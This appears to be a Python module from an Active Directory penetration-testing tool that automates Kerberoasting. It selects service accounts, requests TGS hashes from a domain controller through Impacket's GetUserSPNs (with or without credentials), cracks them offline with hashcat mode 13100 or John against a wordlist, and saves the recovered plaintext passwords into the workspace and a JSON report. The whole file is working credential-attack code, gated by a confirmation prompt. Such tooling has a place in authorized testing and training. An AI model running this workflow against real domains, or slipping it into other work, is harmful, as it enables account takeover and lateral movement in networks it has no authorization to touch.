from __future__ import annotations

import json
import re
import subprocess
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING

from admapper.creds.common import (
    apply_cracked_credentials,
    pick_dc_ip,
    spn_from_tgs_hash,
    username_from_kerberos_hash,
    workspace_password_cred,
)
from admapper.creds.crack import crack_with_hashcat, crack_with_john, find_wordlist
from admapper.guides.render import print_manual_guide
from admapper.models.finding import Finding, FindingSeverity
from admapper.models.hash_record import TgsHash
from admapper.stores.findings import FindingsStore
from admapper.stores.kerberos_hashes import TgsHashStore
from admapper.stores.users import UsersStore
from admapper.support.output import (
    ConfirmLevel,
    confirm,
    print_info,
    print_success,
    print_table,
    print_warning,
)
from admapper.support.platform import resolve_impacket_script, run_command, tool_install_hint

if TYPE_CHECKING:
    from admapper.support.session import Session

_TGS_HASHCAT_RE = re.compile(r"^\$krb5tgs\$[^\s]+$")
_HASHCAT_MODE_TGS = 13100


@dataclass
class KerberoastResult:
    domain: str
    dc_ip: str
    auth_mode: str
    hashes: list[TgsHash] = field(default_factory=list)
    cracked: list[tuple[str, str]] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)


def _kerberoast_targets(session: Session, usernames: list[str] | None) -> list[str]:
    if usernames:
        return [u.strip() for u in usernames if u.strip()]
    users_store = UsersStore(session.workspaces, session.workspace.name)  # type: ignore[union-attr]
    return [
        u.username
        for u in users_store.list()
        if u.kerberoastable and not u.is_machine_account and u.enabled
    ]


def _parse_getuserspns_output(stdout: str, domain: str) -> list[TgsHash]:
    hashes: list[TgsHash] = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("[") or line.startswith("Impacket"):
            continue
        if not _TGS_HASHCAT_RE.match(line):
            continue
        username = username_from_kerberos_hash(line)
        hashes.append(
            TgsHash(
                username=username,
                domain=domain,
                spn=spn_from_tgs_hash(line),
                hashcat=line,
            )
        )
    return hashes


def request_tgs_hashes(
    domain: str,
    dc_ip: str,
    *,
    username: str | None = None,
    password: str | None = None,
    users: list[str] | None = None,
    timeout: int = 180,
) -> tuple[list[TgsHash], str | None, str]:
    """Request Kerberoast TGS hashes via Impacket GetUserSPNs."""
    try:
        import impacket  # noqa: F401
    except ImportError:
        return [], f"impacket not installed — {tool_install_hint('impacket')}", "none"

    cmd_base = resolve_impacket_script("GetUserSPNs")
    if username and password:
        principal = f"{domain}/{username}:{password}"
        auth_mode = "credential"
    else:
        principal = f"{domain}/"
        auth_mode = "no-pass"

    cmd = [
        *cmd_base,
        principal,
        "-dc-ip",
        dc_ip,
        "-request",
    ]

    users_file: str | None = None
    try:
        if auth_mode == "no-pass":
            cmd.append("-no-pass")
        if users:
            import tempfile

            with tempfile.NamedTemporaryFile(
                "w", suffix=".txt", delete=False, encoding="utf-8"
            ) as handle:
                handle.write("\n".join(users))
                handle.write("\n")
                users_file = handle.name
            cmd.extend(["-usersfile", users_file])

        proc = run_command(cmd, timeout=timeout)
        output = (proc.stdout or "") + "\n" + (proc.stderr or "")
        if proc.returncode not in (0,) and "$krb5tgs$" not in output:
            return [], output.strip() or f"GetUserSPNs exited {proc.returncode}", auth_mode
        return _parse_getuserspns_output(output, domain), None, auth_mode
    except subprocess.TimeoutExpired:
        return [], "GetUserSPNs timed out", auth_mode
    except OSError as exc:
        return [], str(exc), auth_mode
    finally:
        if users_file:
            Path(users_file).unlink(missing_ok=True)


def run_kerberoast(
    session: Session,
    *,
    usernames: list[str] | None = None,
    wordlist: Path | str | None = None,
    crack: bool = True,
) -> KerberoastResult:
    """Phase 5 — Kerberoasting workflow."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    domain = session.workspace.domain
    if not domain:
        raise ValueError("set domain <fqdn> before kerberoast")

    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        raise ValueError("no DC with Kerberos — run start_unauth first")

    targets = _kerberoast_targets(session, usernames)
    cred = workspace_password_cred(session, domain)
    if not targets and not cred:
        raise ValueError("no Kerberoastable users — run enum users, or add creds for full SPN dump")

    auth_hint = "workspace credential" if cred else "no-pass (LDAP anonymous)"
    if not confirm(
        f"Kerberoast via {auth_hint} against {dc_ip}?",
        level=ConfirmLevel.WARN,
        mode_auto=session.mode.value == "auto",
        mode_manual=session.mode.value == "manual",
    ):
        print_warning("Kerberoast cancelled")
        return KerberoastResult(domain=domain, dc_ip=dc_ip, auth_mode="cancelled")

    print_info(f"Phase 5 — Kerberoasting @ {dc_ip} ({auth_hint})")
    user_arg = targets if targets else None
    if cred:
        hashes, error, auth_mode = request_tgs_hashes(
            domain,
            dc_ip,
            username=cred[0],
            password=cred[1],
            users=user_arg,
        )
    else:
        hashes, error, auth_mode = request_tgs_hashes(
            domain,
            dc_ip,
            users=user_arg,
        )

    if error and not hashes:
        raise ValueError(error)

    ws_name = session.workspace.name
    hash_store = TgsHashStore(session.workspaces, ws_name)
    stored = hash_store.merge(hashes)
    result = KerberoastResult(
        domain=domain,
        dc_ip=dc_ip,
        auth_mode=auth_mode,
        hashes=stored,
    )
    if error:
        result.errors.append(error)

    rows = [
        [
            h.username,
            h.spn or "-",
            h.hashcat[:40] + "…",
            h.cracked_password or "",
        ]
        for h in stored
    ]
    if rows:
        print_table("Kerberoast hashes", ["user", "spn", "hash", "cracked"], rows)
    print_success("hashes saved → kerberoast_hashes.json + kerberoast_hashcat.txt")

    findings_store = FindingsStore(session.workspaces, ws_name)
    findings_store.merge(
        [
            Finding(
                key="kerberoast_hashes",
                title=f"Kerberoast TGS hashes obtained ({len(stored)})",
                severity=FindingSeverity.MEDIUM,
                source="kerberoast",
                detail=f"dc={dc_ip}, auth={auth_mode}",
                mitre_id="T1558.003",
            )
        ]
    )

    if crack and stored:
        wl = Path(wordlist) if wordlist else find_wordlist()
        if wl is None:
            print_warning(
                "no wordlist found — skip cracking (use --wordlist or place rockyou in "
                "~/.admapper/wordlists/)"
            )
        else:
            print_info(f"Cracking with wordlist: {wl}")
            hash_file = hash_store.hashcat_export_path
            cracked = crack_with_hashcat(hash_file, wl, mode=_HASHCAT_MODE_TGS)
            if not cracked:
                cracked = crack_with_john(hash_file, wl)
            if cracked:
                for item in stored:
                    for user_key, password in cracked.items():
                        if user_key.lower().endswith(item.username.lower()):
                            item.cracked_password = password
                hash_store.save_all(stored)
                result.cracked = apply_cracked_credentials(
                    session, domain, cracked, source="kerberoast"
                )
                for user_name, password in result.cracked:
                    print_success(f"cracked: {domain}\\{user_name}:{password}")
            else:
                print_warning(
                    "no passwords cracked — try hashcat -m 13100 manually with a larger wordlist"
                )

    report_path = session.workspaces.path_for(ws_name) / "kerberoast_report.json"
    report_path.write_text(
        json.dumps(
            {
                "domain": domain,
                "dc_ip": dc_ip,
                "auth_mode": auth_mode,
                "targets": targets,
                "hash_count": len(stored),
                "cracked": [{"user": u, "password": p} for u, p in result.cracked],
                "errors": result.errors,
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )

    print_manual_guide("kerberoast", session=session)
    return result
